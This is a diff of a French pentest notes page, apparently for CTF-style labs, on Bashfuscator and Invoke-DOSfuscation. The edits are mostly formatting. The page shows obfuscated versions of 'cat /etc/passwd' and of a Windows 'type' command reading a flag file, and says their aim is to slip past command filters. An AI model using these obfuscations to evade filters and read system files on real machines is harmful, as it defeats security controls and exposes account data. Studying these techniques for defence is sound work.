@@ -2,7 +2,7 @@
 
 ## <mark style="color:red;">1.</mark> <mark style="color:red;"></mark><mark style="color:red;">**Outils pour Linux (Bashfuscator)**</mark>
 
-**Installation et Configuration de Bashfuscator**
+<mark style="color:green;">**Installation et Configuration de Bashfuscator**</mark>
 
 *   **Clone du dépôt GitHub** :
 
@@ -34,8 +34,6 @@ Vous pouvez affiner l'obfuscation en utilisant des options supplémentaires comm
 ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
 ```
 
-Exemple de commande obfusquée :
-
 {% code overflow="wrap" fullWidth="true" %}
 ```bash
  "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
@@ -44,7 +42,7 @@ Exemple de commande obfusquée :
 
 Cela permet d'exécuter la commande sans que le filtre ne la détecte, même si elle semble totalement obfusquée.
 
-**Test de la Commande Obfusqué**
+<mark style="color:green;">**Test de la Commande Obfusqué**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
 ```bash
@@ -62,7 +60,7 @@ troot:x:0:0:root:/root:/bin/bash
 
 ## <mark style="color:red;">2.</mark> <mark style="color:red;"></mark><mark style="color:red;">**Outils pour Windows (DOSfuscation)**</mark>
 
-**Installation et Configuration de DOSfuscation**
+<mark style="color:green;">**Installation et Configuration de DOSfuscation**</mark>
 
 *   **Clone du dépôt GitHub** :
 
@@ -72,7 +70,7 @@ troot:x:0:0:root:/root:/bin/bash
     Import-Module .\Invoke-DOSfuscation.psd1
     ```
 
-**Utilisation de DOSfuscation**
+<mark style="color:green;">**Utilisation de DOSfuscation**</mark>
 
 Une fois l'outil installé, il est interactif et vous permet de choisir des options pour obfusquer les commandes. Exemple d'utilisation pour obfusquer une commande de type `type` :
 
@@ -84,15 +82,13 @@ Invoke-DOSfuscation\Encoding> 1
 ```
 {% endcode %}
 
-L'outil retournera une version obfusquée de la commande :
-
 {% code overflow="wrap" fullWidth="true" %}
 ```ruby
 typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
 ```
 {% endcode %}
 
-**Exécution de la Commande Obfusquée**
+<mark style="color:green;">**Exécution de la Commande Obfusquée**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
 ```powershell
